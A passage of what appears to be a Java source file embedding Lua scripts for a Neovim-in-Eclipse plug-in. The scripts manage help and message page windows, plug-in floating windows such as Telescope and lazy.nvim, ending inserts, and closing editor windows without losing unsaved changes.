            --- window. Marked as the plug-in's, so the WinNew net leaves it, and :q in it is a host
            --- command.
            function M.open_page(buf, kind)
              if not page_ok(buf, kind or 'messages') then
                return -2
              end
              page_buffer(buf)
              local win = quietly(function()
                local w = vim.api.nvim_tabpage_get_win(vim.api.nvim_open_tabpage(buf, false, {}))
                vim.api.nvim_win_call(w, function()
                  vim.cmd('clearjumps') -- the current window's jumps are another editor's
                end)
                -- Where PAGE_TEXT puts the cursor of the page's windows ("end": on the newest
                -- message): a window opened after the text was filled gets it too.
                if vim.b[buf].neovim4eclipse_page_cursor == 'end' then
                  pcall(vim.api.nvim_win_set_cursor, w, { vim.api.nvim_buf_line_count(buf), 0 })
                end
                for name, value in pairs(PAGE_OPTIONS) do
                  vim.wo[w][name] = value
                end
                help_options(w, kind)
                give_ide_keys_back(buf)
                return w
              end)
              own[win] = 'page'
              seen[win] = true
              page_buf[win] = buf
              page_kind[win] = kind or 'messages'
              return win
            end

            --- Whether win is a page's window (M.open_page).
            function M.is_page(win)
              return own[win] == 'page'
            end

            --- Opens another page window like win: on the buffer it shows, of its kind (a :split of
            --- the page: a second view, each with its own cursor). Returns { window, buffer }, or
            --- { -1, -1 } when win is no page window.
            function M.open_page_like(win)
              local buf = page_buf[win]
              if own[win] ~= 'page' or not buf or not vim.api.nvim_buf_is_valid(buf) then
                return { -1, -1 }
              end
              local second = M.open_page(buf, page_kind[win])
              pcall(vim.api.nvim_win_set_cursor, second, vim.api.nvim_win_get_cursor(win))
              return { second, buf }
            end

            --- Shows buf, a buffer of Neovim's own for page kind ('help': the page :help opened;
            --- 'checkhealth': a report), in page window win with the cursor on line, the line at
            --- the top as :help puts it; when win is no open page window, in a new one
            --- (M.open_page). Returns the window, or -2 when buf is gone. A report the window showed
            --- before is wiped when no window shows it any more: :checkhealth makes a new buffer
            --- each time, and an old one would stay in :ls! for nothing. Old help buffers stay, as in
            --- Vim (Ctrl-T and Ctrl-O go back to them). Example: :help options with the help editor
            --- open: its window changes to options.txt, quietly, on the topic's line.
            function M.show_page(win, buf, line, kind)
              if not page_ok(buf, kind) then
                return -2
              end
              if own[win] ~= 'page' or not vim.api.nvim_win_is_valid(win) then
                win = M.open_page(buf, kind)
              else
                local old = page_buf[win]
                page_buffer(buf)
                quietly(function()
                  put_buf(win, buf)
                  for name, value in pairs(PAGE_OPTIONS) do
                    vim.wo[win][name] = value
                  end
                  help_options(win, kind)
                end)
                give_ide_keys_back(buf)
                page_buf[win] = buf
                page_kind[win] = kind
                if old and old ~= buf and vim.api.nvim_buf_is_valid(old) and vim.bo[old].filetype == 'checkhealth'
                    and #vim.fn.win_findbuf(old) == 0 then
                  pcall(vim.api.nvim_buf_delete, old, { force = true })
                end
              end
              if win > 0 then
                local last = vim.api.nvim_buf_line_count(buf)
                line = math.max(1, math.min(line, last))
                vim.api.nvim_win_call(win, function()
                  vim.fn.winrestview({ lnum = line, col = 0, topline = line })
                end)
              end
              return win
            end

            --- Called on each BufEnter (SETUP): when a help page's window now shows another help
            --- buffer, put there by Neovim's help itself (Ctrl-], :help typed in it, Ctrl-T,
            --- :cnext through a :helpgrep), that buffer becomes the page's, as Vim's help window
            --- goes from page to page. Returns whether it did; Eclipse then counts it as the
            --- page's too (DocumentBuffers.onEntered). Any other buffer in a page window is put
            --- back (M.restore_page). Example: Ctrl-] on |options| in the help editor:
            --- options.txt is the page now.
            function M.follow_page(win, buf)
              if own[win] ~= 'page' or page_kind[win] ~= 'help' or page_buf[win] == buf then
                return false
              end
              if vim.api.nvim_buf_is_valid(buf) and M.is_document(buf) and vim.bo[buf].buftype == 'help' then
                give_document_back(buf) -- Ctrl-] to it: the page gets its own buffer back (restore_page)
                return false
              end
              if not page_ok(buf, 'help') then
                return false
              end
              page_buf[win] = buf
              page_buffer(buf)
              give_ide_keys_back(buf)
              return true
            end

            --- Puts a page window's own buffer back into it, quietly and without a jump, after Neovim
            --- put another one there (gf on a path in the page, :b 3): a page shows only its text,
            --- and Eclipse opens the other buffer's file in an editor of its own. Returns the page's
            --- buffer, or -1 when win is no open page window (or its buffer is gone).
            function M.restore_page(win)
              local buf = page_buf[win]
              if not buf or not vim.api.nvim_win_is_valid(win) or not vim.api.nvim_buf_is_valid(buf) then
                return -1
              end
              if vim.api.nvim_win_get_buf(win) ~= buf then
                quietly(put_buf, win, buf)
              end
              return buf
            end

            --- Whether Neovim is in an insert, or in the one command of Ctrl-O inside one ('niI'), after
            --- which the insert would go on.
            local function in_insert()
              local mode = vim.api.nvim_get_mode().mode
              return mode:match('^[iR]') ~= nil or mode:match('^ni') ~= nil
            end

            --- Ends an insert that a plug-in carried out of its float, keeping the cursor of the window
            --- Neovim is in now. For Eclipse's own routes the insert has ended already, in the float
            --- (M.end_float_insert); this is what is left for a float that moved Neovim itself.
            --- :stopinsert takes effect once the running call is over, in that window, and Esc moves the
            --- cursor a column left there: it is put back as the insert ends, so the editor's caret
            --- stays. Until then the cursor waits on the next character that is not white space, or
            --- an empty line: an insert that has only auto-indented ('o' in the float, nothing typed)
            --- ends by removing the white space at the cursor of the window Neovim is in, here the
            --- document's. Example: 'o' in a float whose plug-in then enters the editor's window, the
            --- document's cursor at the start of "    keep": the cursor waits on the k, and the line
            --- keeps its indentation. A document of only white space has no such place: its line
            --- loses that white space (Eclipse's routes do not come here, M.end_float_insert).
            --- After Ctrl-O no Esc comes and no indent is left, so there is nothing to put back.
            local function stop_insert_in_place()
              if vim.api.nvim_get_mode().mode:match('^ni') then
                vim.cmd.stopinsert()
                return
              end
              local landed = vim.api.nvim_get_current_win()
              local at = vim.api.nvim_win_get_cursor(landed)
              local safe = vim.fn.searchpos([[\\S\\|^$]], 'cnw')
              if safe[1] > 0 then
                pcall(vim.api.nvim_win_set_cursor, landed, { safe[1], safe[2] - 1 })
              end
              vim.api.nvim_create_autocmd('ModeChanged', { once = true, pattern = '[iR]*:*', callback = function()
                if vim.api.nvim_win_is_valid(landed) and vim.api.nvim_get_current_win() == landed then
                  pcall(vim.api.nvim_win_set_cursor, landed, at)
                end
              end })
              vim.cmd.stopinsert()
            end

            -- The float that had the keyboard as Neovim's start ended, before any editor was shown
            -- (M.close_start_floats): the first editor takes it along (settle_start_float).
            local pending_start_float
            -- Whether Eclipse has shown an editor yet (M.show).
            local editor_shown = false

            --- Says that a float was closed, or refused to close, as the start ended. Once the caller
            --- is over (vim.schedule): an error message from inside UIEnter gets Neovim's "Error in
            --- UIEnter Autocommands for "*":" above it, as if the check had failed. Said as an error
            --- still, as the other closes are (and ui2 shows a long one in full).
            local function say_at_start(message)
              vim.schedule(function()
                vim.api.nvim_echo({ { message } }, true, { err = true })
              end)
            end

            --- The first editor is shown in win: the float waiting for it gets the keyboard, as it
            --- has in a terminal, if the editor draws it now (M.bring_start_floats brought it to win's
            --- tab page; one hanging on a window or the cursor stays behind). If not, it is closed,
            --- not by force, with a message: keys go only to a window Eclipse draws.
            local function settle_start_float(win)
              local float = pending_start_float
              pending_start_float = nil
              if not float then
                return
              end
              local there = vim.api.nvim_win_is_valid(float) and M.focused_float(float)
              if there and not vim.api.nvim_win_get_config(float).hide
                  and vim.api.nvim_win_get_tabpage(float) == vim.api.nvim_win_get_tabpage(win)
                  and pcall(vim.api.nvim_set_current_win, float)
                  and vim.api.nvim_get_current_win() == float then
                return
              end
              if there then
                local name = float_name(float)
                if pcall(vim.api.nvim_win_close, float, false) then
                  say_at_start(M.float_closed_message(name, AT_START))
                else
                  say_at_start(M.float_kept_message(name, AT_START))
                end
              end
            end

            --- Whether M.show enters a window for win and buf: buf still there (a plug-in's :bwipeout
            --- wipes it), and win the home window (-1) or a window still there.
            local function shows(win, buf)
              return vim.api.nvim_buf_is_valid(buf) and (win < 0 or vim.api.nvim_win_is_valid(win))
            end

            function M.show(win, buf)
              if not shows(win, buf) then
                -- -2: wiped in Neovim, Eclipse shows the home buffer; -1: closed in Neovim, Eclipse
                -- opens a new one
                return vim.api.nvim_buf_is_valid(buf) and -1 or -2
              end
              if win < 0 then
                win = M.home()
              end
              local current = vim.api.nvim_get_current_win()
              set_buf(win, buf)
              if win ~= current then
                vim.api.nvim_set_current_win(win) -- BufEnter, with the buffer Eclipse expects
              end
              editor_shown = true
              -- After entering win: a float moved while current would take Neovim back to its tab page.
              M.bring_start_floats(win, vim.v.vim_did_enter ~= 1 or pending_start_float ~= nil)
              settle_start_float(win)
              -- One check, where every show ends, from Neovim's state: in the editor's window, an insert
              -- begun in a float (any float, the one waiting or not, closed or left) ends here, or
              -- the keys meant for it would be typed into the document.
              if insert_float ~= nil and vim.api.nvim_get_current_win() == win and in_insert() then
                stop_insert_in_place()
              end
              return win
            end

            function M.travel(win, buf, line, col)
              quietly(function()
                put_buf(win, buf) -- no jump in the window left behind (see put_buf)
                local last = vim.api.nvim_buf_line_count(buf)
                pcall(vim.api.nvim_win_set_cursor, win, { math.max(1, math.min(line, last)), math.max(0, col) })
              end)
            end

            --- The buffer the home window shows instead of one being closed: fallback, which Eclipse
            --- names (the attached buffer, or the home buffer), or the home buffer, made anew if need
            --- be, when Neovim wiped fallback. The one rule for every close (M.close, M.release), so
            --- that none puts a wiped buffer in a window. Example: a plug-in ran :bwipeout 2, the
            --- home buffer Eclipse still names; closing the active editor shows a new home buffer
            --- instead of failing with E86 (or leaving Neovim's own choice in the home window).
            local function fallback_buf(fallback)
              return vim.api.nvim_buf_is_valid(fallback) and fallback or M.home_buffer()
            end

            --- Leaves win (quietly) for the home window showing fallback, if win is the current one.
            local function leave(win, fallback)
              if win == vim.api.nvim_get_current_win() then
                local to = M.home()
                quietly(function()
                  vim.api.nvim_set_current_win(to)
                  put_buf(to, fallback_buf(fallback))
                end)
              end
            end

            --- Whether Neovim is in a plug-in's float in the tab page of win, an editor's window it is
            --- not in: the float that closing win leaves first (leave_float_of), and so the one whose
            --- insert ends first (M.end_float_insert). Example: Telescope's prompt open over editor A,
            --- A closing: true; B closing in the background: false, the prompt keeps its insert.
            local function in_float_of(win)
              local current = vim.api.nvim_get_current_win()
              return current ~= win and M.focused_float(current)
                and vim.api.nvim_win_get_tabpage(current) == vim.api.nvim_win_get_tabpage(win)
            end

            --- Whether win is an editor's window that M.close and M.release close: still there, and
            --- not the home window, which is never closed (it shows another buffer instead).
            local function closable(win)
              return vim.api.nvim_win_is_valid(win) and win ~= home
            end

            --- Whether closing win (M.close, M.release) takes Neovim out of the plug-in's float it is
            --- in: a float in win's tab page, left first (leave_float_of), or win itself, a float on
            --- the buffer being released, left for the home window (leave). Example: an insert in a
            --- peek float on b.txt, b.txt's editor closing in the background: true, so that the
            --- insert ends in the float and does not go on in the home window's document.
            local function closing_leaves_float(win)
              local current = vim.api.nvim_get_current_win()
              return closable(win) and (in_float_of(win) or (win == current and M.focused_float(win)))
            end

            --- Before win, an editor's window, closes: a plug-in's float with the cursor in win's tab
            --- page is left first (M.leave_float), closed as Eclipse mode closes one, so that its insert
            --- ends and its plug-in cleans up (Telescope's BufLeave). Closing the tab quietly would
            --- close the float with it, and Neovim would go on in insert mode in another window.
            --- Example: Telescope's prompt open in editor A, the user closes A; the next keys are
            --- normal-mode keys in editor B. And a float on a file with unsaved changes that the tab's
            --- close takes along keeps its buffer, hidden, whatever 'hidden' and 'bufhidden' say.
            local function leave_float_of(win)
              local tab = vim.api.nvim_win_get_tabpage(win)
              if in_float_of(win) then
                M.leave_float()
              end
              -- A float leaving could not close (close_float: Neovim refused, closing would unload
              -- or wipe a file's unsaved changes) closes with the tab page now: its buffer is kept,
              -- hidden ('bufhidden' hide), so that the changes stay (:ls), as leaving promised.
              for _, w in ipairs(vim.api.nvim_tabpage_list_wins(tab)) do
                local buf = vim.api.nvim_win_get_buf(w)
                if not own[w] and vim.api.nvim_win_get_config(w).relative ~= ''
                    and vim.bo[buf].buftype == '' and vim.bo[buf].modified then
                  vim.bo[buf].bufhidden = 'hide'
                end
              end
            end

            --- Closes an editor's window quietly. It is forgotten here too: being quiet, the close
            --- fires no WinClosed, which would.
            local function close_quietly(win)
              quietly(vim.api.nvim_win_close, win, true)
              own[win] = nil
              page_buf[win] = nil
              page_kind[win] = nil
              seen[win] = nil -- no WinClosed while quiet
            end

            function M.close(win, fallback)
              if closable(win) then
                leave_float_of(win)
                leave(win, fallback)
                close_quietly(win)
              end
              return { M.home(), M.home_buffer() }
            end

            function M.release(buf, fallback)
              local closed = {}
              for _, win in ipairs(vim.fn.win_findbuf(buf)) do
                if win == home then
                  set_buf(win, fallback_buf(fallback))
                elseif closable(win) then -- leaving a float may have closed one
                  leave_float_of(win)
                  leave(win, fallback)
                  close_quietly(win)
                  closed[#closed + 1] = win
                end
              end
              return { closed, M.home_buffer() }
            end

            """;

    /** The second half of {@link #WINDOWS}, which see. */
    private static final String WINDOWS_SECOND_HALF = """
            --- Whether win (0: the current one) is a window Neovim opened beside an editor's for a
            --- moment, which :q, :close and Ctrl-W c close in Neovim, not the editor: a floating
            --- window the user entered (hover documentation, a plug-in's picker) or one of Neovim's
            --- special windows the safety net below leaves open (the command-line window).
            --- Example: a second K into a hover float, then :q closes the float.
            function M.is_side_window(win)
              win = win == 0 and vim.api.nvim_get_current_win() or win
              return not own[win] and vim.fn.win_gettype(win) ~= ''
            end

            --- Why :tabonly! does not run (WINDOW_COMMANDS refuses it): it would discard the changes of
            --- every other editor tab at once, where Vim's keeps their buffers hidden.
            M.TABS = "with ! it would discard every other editor tab's changes; :tabonly asks about them"
            --- Whether win shows one of ui2's own buffers (its command line, messages, pager or
            --- prompt; LuaScripts.UI2): Neovim's own windows, which the safety net leaves alone.
            local function shows_ui2_buffer(win)
              local ui2 = package.loaded['vim._core.ui2']
              if not ui2 or not vim.api.nvim_win_is_valid(win) then
                return false
              end
              local buf = vim.api.nvim_win_get_buf(win)
              for _, own in pairs(ui2.bufs) do
                if own == buf then
                  return true
                end
              end
              return false
            end

            --- While Neovim is still starting (v:vim_did_enter 0: a configuration still running,
            --- lazy.nvim installing missing plug-ins in vim.wait), brings the plug-ins' floating
            --- windows of the other tab pages into win's, the editor Eclipse shows: a float belongs to
            --- one tab page, and one the configuration opened before any editor was there (lazy.nvim's
            --- installer and its backdrop, in the home window's tab page) would otherwise be drawn
            --- nowhere, the install looking like Eclipse hung. Moved as they are, placed on the screen
            --- (relative 'editor'; one hanging on a window or the cursor stays where it is), with
            --- the focus where it was. Once Neovim has started, floats stay in their own tab page,
            --- as in Neovim. Neither the plug-in's own windows nor ui2's are moved. What closes such
            --- a float at the start's end is close_start_floats. Example: lazy.nvim's window 1001 in
            --- tab page 1, the first editor shown in tab page 2: 1001 moves to tab page 2, drawn
            --- over the editor with its progress. starting: whether Neovim is still starting (M.show
            --- passes v:vim_did_enter ~= 1; a spec passes it, being past the start).
            function M.bring_start_floats(win, starting)
              if not starting or not vim.api.nvim_win_is_valid(win) then
                return
              end
              local tab = vim.api.nvim_win_get_tabpage(win)
              for _, w in ipairs(vim.api.nvim_list_wins()) do
                local config = vim.api.nvim_win_get_config(w)
                if not own[w] and config.relative == 'editor' and not shows_ui2_buffer(w)
                    and vim.api.nvim_win_get_tabpage(w) ~= tab then
                  config.win = win
                  pcall(vim.api.nvim_win_set_config, w, config)
                end
              end
            end

            --- Whether win (0: the current one) is a floating window of a plug-in, not the
            --- plug-in's own and not one of ui2's: a picker's prompt (Telescope), :Lazy, a hover
            --- float the user entered. An insert that begins in one is Neovim's to its end
            --- (SETUP's ModeChanged report): its buffer is no document, so Eclipse must not type it.
            function M.focused_float(win)
              win = win == 0 and vim.api.nvim_get_current_win() or win
              return not own[win] and vim.fn.win_gettype(win) == 'popup' and not shows_ui2_buffer(win)
            end

            --- The window Eclipse's scripts for the editor's view act on (VIEWPORT_OVERHEAD, SET_FOLDS,
            --- SET_WRAP, SET_TOPLINE, SCROLL_LINES): the current one, or, while Neovim is in a
            --- plug-in's float (a picker's prompt, lazy.nvim's installer), the window of the
            --- plug-in's own under it, the editor's or page's of that tab page. They run in it with
            --- nvim_win_call, which fires no autocommands, so the float keeps the focus. Example: the
            --- editor resized while :Lazy is open: Neovim's screen is measured on the editor's window.
            function M.editor_window()
              local current = vim.api.nvim_get_current_win()
              if not M.focused_float(current) then
                return current
              end
              for _, w in ipairs(vim.api.nvim_tabpage_list_wins(vim.api.nvim_win_get_tabpage(current))) do
                if own[w] and vim.api.nvim_win_get_config(w).relative == '' then
                  return w
                end
              end
              return current
            end

            --- Whether Neovim entered win, a plug-in's float, to stay: one rule for every plug-in's
            --- float with the cursor (a picker's prompt as it opens, :Lazy, a hover float entered
            --- by a second K), current, entered outside an insert. SETUP's BufEnter report says so, and Eclipse leaves Neovim there
            --- (util/EnterDecision) instead of sending it back to the editor's window, where the
            --- insert a picker starts next would begin and Eclipse would type it. Not the buffer's
            --- kind: Telescope makes its prompt buffer a prompt only after entering the window
            --- (plenary's popup opens a scratch buffer, then Telescope sets 'buftype'). One entered
            --- during an insert (a plug-in's timer while Eclipse types) is sent back, as before:
            --- the insert is the editor's. Unless that insert began in a plug-in's float
            --- (insert_float, set at InsertEnter; not the previous window, which a plug-in can pass
            --- through without an autocommand): a click from a picker's prompt on a second float
            --- enters that one still in Insert mode, and sent back, the next letters would land in
            --- the file. Leaving the editor moves Neovim out of the float (M.move_out_of_float). Whether
            --- the editor draws it is not asked here: one it does not draw (hidden, past the limits)
            --- is closed in the one place that decides it, M.close_undrawn.
            function M.entered_float(win)
              if not M.focused_float(win) or win ~= vim.api.nvim_get_current_win() then
                return false
              end
              if not vim.api.nvim_get_mode().mode:match('^[iR]') then
                return true
              end
              return insert_float ~= nil
            end

            --- Closes win, a plug-in's float, as leaving it does: not by force, so that a buffer of
            --- the user's with unsaved changes is not lost. With 'hidden' (Neovim's default) the
            --- window closes and the buffer stays, hidden and changed (:ls lists it); Neovim refuses
            --- only when closing would unload or wipe it ('bufhidden', 'nohidden'). A prompt, a
            --- scratch or terminal buffer never counts as changed: Telescope's and lazy.nvim's close.
            --- Refused, Neovim leaves the float for the editor's window of its tab, and the float
            --- stays, drawn without the focus. Whether it closed.
            local function close_float(win)
              -- Asked of the window, not of the call: a plug-in's WinClosed, BufWinLeave or BufHidden
              -- handler that throws makes nvim_win_close fail after the window has gone.
              if pcall(vim.api.nvim_win_close, win, false) or not vim.api.nvim_win_is_valid(win) then
                return true
              end
              if win == vim.api.nvim_get_current_win() then
                for _, w in ipairs(vim.api.nvim_tabpage_list_wins(vim.api.nvim_win_get_tabpage(win))) do
                  if own[w] then
                    pcall(vim.api.nvim_set_current_win, w)
                    break
                  end
                end
              end
              return false
            end

            --- Whether win, the float a route of Eclipse's names (M.leave_float, M.move_out_of_float),
            --- is another than current, the window Neovim is in: then Neovim has gone on since, and
            --- stays where it is. nil, 0 or -1 name none.
            local function names_other(win, current)
              return win ~= nil and win > 0 and win ~= current
            end

            --- Leaves the plug-in's float the cursor is in, closing it (close_float): the user turned
            --- Neovim mode off, its editor is closing, or the editor does not draw it. For the user
            --- clicking away, M.move_out_of_float keeps it open. An insert in it ends first. Again
            --- while the window Neovim is in then is a plug-in's float too (a picker's results,
            --- should its plug-in leave the focus there), so that the cursor ends outside every one;
            --- a plug-in closes its other windows itself when its prompt closes (Telescope does).
            --- win (optional): the float to close instead, though Neovim may have gone on since; only
            --- that one closes, and an insert Neovim carried out of it ends. Whether one was closed.
            --- Example: Telescope's prompt open, Eclipse mode turned on: the prompt closes, Telescope
            --- closes its results and preview, Neovim is back in the editor's window.
            function M.leave_float(win)
              local current = vim.api.nvim_get_current_win()
              local named = names_other(win, current)
              local target = named and win or current
              -- The insert begun in the float ends, also when Neovim already went on with it and the
              -- float closed itself on leaving (a plug-in's input that closes on BufLeave); not an
              -- insert begun elsewhere since (Eclipse's, in the editor the user went to). With a float
              -- named, only that float's insert: Neovim is no longer in it, and a float it is in now
              -- may be the next part's picker, whose own insert began since.
              local stop = in_insert() and insert_float ~= nil
                and (insert_float == target or (not named and M.focused_float(current)))
              local closed = false
              if vim.api.nvim_win_is_valid(target) and M.focused_float(target) then
                if named then
                  closed = close_float(target)
                else
                  for _ = 1, 10 do -- a bound: each round closes a window, so a plug-in reopening one cannot loop
                    local w = vim.api.nvim_get_current_win()
                    if not M.focused_float(w) or not close_float(w) then
                      break
                    end
                    closed = true
                  end
                end
              end
              if stop then
                stop_insert_in_place() -- in the window Neovim is in by now, the editor's
              end
              return closed
            end

            --- Moves Neovim out of the plug-in's float it is in, to the editor's or page's window of that
            --- tab page, and leaves the float open: what a click outside a float does in a terminal.
            --- The plug-in decides whether its window survives that: Telescope closes its picker on
            --- BufLeave, and :Lazy stays, drawn without the focus, until it is clicked or closed. For
            --- the user clicking the text or leaving for another part of Eclipse
            --- (editor/LineOnFocusLoss, NeovimEditorController). An insert begun in the float ends, as
            --- in M.leave_float. win (optional): the float the cursor was in when the keyboard left a
            --- part; when Neovim has gone on since, there is nothing to move, and only that float's
            --- insert ends. Whether Neovim moved.
            function M.move_out_of_float(win)
              local current = vim.api.nvim_get_current_win()
              local named = names_other(win, current)
              local target = named and win or current
              local stop = in_insert() and insert_float ~= nil
                and (insert_float == target or (not named and M.focused_float(current)))
              local moved = false
              if not named and M.focused_float(current) then
                local to = M.editor_window() -- the float itself when its tab page has no window of ours
                moved = to ~= current and pcall(vim.api.nvim_set_current_win, to)
              end
              if stop then
                stop_insert_in_place() -- in the window Neovim is in by now, the editor's
              end
              return moved
            end

            --- Why the window Neovim is in, a plug-in's float, is one the editor does not draw, as
            --- M.close_undrawn words it, or nil when it is none (see there).
            local function undrawn_why(win, past_limits)
              local current = vim.api.nvim_get_current_win()
              if not M.focused_float(current) then
                return nil
              elseif vim.api.nvim_win_get_config(current).hide then
                return HIDDEN
              elseif win == current then
                return 'the editor cannot draw it' .. (past_limits and ' (' .. past_limits .. ')' or '')
              end
              return nil
            end

            --- Closes the plug-in's float Neovim is in when the editor does not draw it, with a message:
            --- keys go only to a window Eclipse draws, and these would go into one nobody sees. The one
            --- place that decides it, for every way a float can be undrawn: the session calls it from the
            --- redraw flush that finds Neovim's cursor on a grid it does not draw (util/Grids.unseenCursor),
            --- whatever route led there (a float that opens with the focus, one entered later, one its
            --- plug-in hides), and it acts only on what it finds here itself: the current window, a
            --- plug-in's float (M.focused_float), and why it is undrawn: hidden by its plug-in (config
            --- hide), or past util/Grids' limits, which only the session can tell: then win, the window
            --- the session saw on that grid, is this one, and past_limits words the limits. Else
            --- nothing: a float the session has not placed yet (its position comes with a later redraw),
            --- or Neovim has moved on. Not by force (M.leave_float, close_float): a changed buffer stays,
            --- and an insert begun in the float ends; a float Neovim refuses to close stays, with a
            --- message. Whether it closed.
            --- Example: Telescope's prompt hidden by a plug-in of its own while Neovim is in it: closed,
            --- with "Closed the floating window of TelescopePrompt: it is hidden, and it would take the
            --- keys unseen".
            function M.close_undrawn(win, past_limits)
              local why = undrawn_why(win, past_limits)
              if not why then
                return false
              end
              local current = vim.api.nvim_get_current_win()
              local name = float_name(current)
              if not M.leave_float() then
                -- Said whether Neovim got out of it or, with no editor's window in its tab page to
                -- go to, is still in it: then this message is the only sign of where the keys go.
                vim.api.nvim_echo({ { M.float_kept_message(name, why .. UNSEEN) } }, true, { err = true })
                return false
              end
              vim.api.nvim_echo({ { M.float_closed_message(name, why .. UNSEEN) } }, true, { err = true })
              return true
            end

            --- For each route of Eclipse's that can take Neovim out of a float, with the arguments of
            --- its script (core/LuaScripts.FLOAT_EXITS names the route of each script): whether that
            --- script will leave the plug-in's float Neovim is in now. The same rule as the script's
            --- own, in one place each (closable, in_float_of, names_other, undrawn_why), so that the
            --- first step (M.end_float_insert) ends an insert only where the second leaves its float.
            --- Example: a background editor closing while the user types in Telescope's prompt over
            --- another: close is false, and the prompt keeps its insert.
            local leaves = {
              -- FOCUS_WINDOW (win, from): enters win, a page's window, when it is still there.
              focus = function(win)
                return win ~= nil and vim.api.nvim_win_is_valid(win)
              end,
              -- SHOW_WINDOW (win, buf): enters win (-1: the home window) unless M.show refuses.
              show = function(win, buf)
                return shows(win, buf)
              end,
              -- CLOSE_WINDOW (win, fallback): leaves a float in win's tab page (M.close).
              close = function(win)
                return closing_leaves_float(win)
              end,
              -- RELEASE_BUFFER (buf, fallback): leaves a float in the tab page of a window it closes,
              -- or a float that shows buf itself (M.release).
              release = function(buf)
                for _, win in ipairs(vim.api.nvim_buf_is_valid(buf) and vim.fn.win_findbuf(buf) or {}) do
                  if closing_leaves_float(win) then
                    return true
                  end
                end
                return false
              end,
              -- LEAVE_FLOAT, MOVE_OUT_OF_FLOAT (win), LEAVE_FLOAT_WITH_LINE (): the current float,
              -- unless another is named.
              move = function(win)
                return not names_other(win, vim.api.nvim_get_current_win())
              end,
              -- CLOSE_UNDRAWN_FLOAT (win, past_limits): the current float, when it is undrawn.
              undrawn = function(win, past_limits)
                return undrawn_why(win, past_limits) ~= nil
              end,
            }

            --- The first of two steps for every route of Eclipse's that takes Neovim out of a float
            --- (core/DocumentBuffers.leavingFloat): ends the insert begun in the float while Neovim is
            --- still in it, when the second step, route's script with these arguments, will leave it
            --- (leaves). The second step, the move or the close, is the next call: :stopinsert takes
            --- effect as this call returns, before Neovim reads the next one. Why not in one step: an
            --- insert that has only auto-indented ('o', nothing typed) ends by removing the white space
            --- at the cursor of the window Neovim is in, and ended from the editor's window that is the
            --- document's line. Example: 'o' in a float, a click on the text: the float's empty line
            --- loses its indent, the document keeps its own. Also an insert waiting to go on after
            --- Ctrl-O: Neovim reports Visual, Select or the command line then ('i<C-o>v', 'i<C-o>:'),
            --- not insert, so only plain Normal mode ('n', where no insert waits) is left alone;
            --- elsewhere :stopinsert ends the insert or the wait for it, and else only Terminal mode
            --- (a terminal in the float), which the second step leaves anyway.
            --- Not the float waiting for the first editor (settle_start_float), which keeps the
            --- keyboard and its insert. An unknown route is an error, a script without its entry.
            --- Whether :stopinsert ran.
            function M.end_float_insert(route, ...)
              local leaving = leaves[route]
              if not leaving then
                error('no float exit named ' .. tostring(route))
              end
              local current = vim.api.nvim_get_current_win()
              if insert_float == nil or current == pending_start_float or not M.focused_float(current)
                  or vim.api.nvim_get_mode().mode == 'n' or not leaving(...) then
                return false
              end
              vim.cmd.stopinsert()
              return true
            end

            --- Why the safety net closed a window, by win_gettype(): '' for a plain one (a split
            --- opened without the command line, which Eclipse never heard of).
            local why_closed = {
              [''] = 'Eclipse shows each window as an editor; :split and :vsplit make one',
              quickfix = 'Eclipse cannot show the quickfix window; :cnext, :cprevious and :cc still work',
              loclist = 'Eclipse cannot show the location list window; :lnext, :lprevious and :ll still work',
              preview = 'Eclipse cannot show the preview window',
            }

            local group = vim.api.nvim_create_augroup('neovim4eclipse_windows', { clear = true })

            --- The one rule for keys typed while Neovim starts: they go where they would in a terminal,
            --- to the window Neovim is in when it reads them, as long as the editor draws that window. A
            --- config's init can keep running while Eclipse is set up and an editor attached (lazy.nvim
            --- installing missing plug-ins waits with vim.wait, in rounds), and a plug-in can open a float
            --- with the focus meanwhile and have VimEnter enter it again (lazy.nvim's window); the keys the
            --- user types then wait in Neovim's input, which Neovim reads only once its start is over. So
            --- at UIEnter, after every VimEnter and before any of those keys is read, the check looks at
            --- where Neovim is. A float in the tab page of the window Eclipse has attached (asked of
            --- Eclipse there and then, eclipse_attached_window), and not hidden, is drawn: it keeps the
            --- keyboard, and the one the config left the focus in before the plug-in set Neovim's windows
            --- up (LEAVE_START_FLOAT hands it over) is entered again, since only the plug-in took Neovim
            --- out of it. A float the editor does not draw is closed (not by force, a changed buffer
            --- stays), with one message naming the first, and Neovim goes to the attached window: keys go
            --- only to a window Eclipse draws. When Neovim has already entered (an init that does not
            --- wait: the usual start), it happens at once. With no editor shown yet, the float cannot be
            --- drawn anywhere: it waits for the first one, whose M.show brings it along and enters it
            --- (settle_start_float). A float opened after that is any other plug-in's, and
            --- M.close_undrawn watches it. As in a terminal, keys typed during an install
            --- are lazy.nvim's then: U, S, X and R are its commands.
            --- Whether it closed one now (false: at UIEnter, or nothing to close). Example: LazyVim's
            --- first start: its installer stays over the first editor, with the keyboard, and q closes it.
            function M.close_start_floats(left)
              local function close()
                -- Eclipse's own answer, not a copy kept here: the editor it attached last (the home
                -- window before any). No channel: not Eclipse's Neovim (the Lua specs).
                local chan = vim.g.neovim4eclipse_channel
                local ok, attached = false, nil
                if chan then
                  ok, attached = pcall(vim.rpcrequest, chan, 'eclipse_attached_window')
                end
                local has_attached = ok and type(attached) == 'number' and attached > 0
                  and vim.api.nvim_win_is_valid(attached)
                local shown_tab = has_attached and vim.api.nvim_win_get_tabpage(attached)
                  or vim.api.nvim_get_current_tabpage()
                local function drawn(w)
                  return vim.api.nvim_win_is_valid(w) and M.focused_float(w)
                    and not vim.api.nvim_win_get_config(w).hide and vim.api.nvim_win_get_tabpage(w) == shown_tab
                end
                local name
                if left and left > 0 and vim.api.nvim_win_is_valid(left) then
                  if drawn(left) then
                    if not M.focused_float(vim.api.nvim_get_current_win()) then
                      if editor_shown then
                        pcall(vim.api.nvim_set_current_win, left)
                      else
                        pending_start_float = left
                      end
                    end
                  else
                    local n = float_name(left)
                    if pcall(vim.api.nvim_win_close, left, false) then
                      name = n
                    end
                  end
                end
                local current = vim.api.nvim_get_current_win()
                if M.focused_float(current) and not drawn(current) then
                  local n = float_name(current)
                  if M.leave_float() then
                    name = name or n
                  end
                elseif M.focused_float(current) and not editor_shown then
                  pending_start_float = current
                end
                if not drawn(vim.api.nvim_get_current_win()) and has_attached
                    and attached ~= vim.api.nvim_get_current_win() then
                  pcall(vim.api.nvim_set_current_win, attached)
                end
                if name then
                  say_at_start(M.float_closed_message(name, AT_START)) -- the keys typed meanwhile come first
                end
                return name ~= nil
              end
              if vim.v.vim_did_enter == 1 then
                return close()
              end
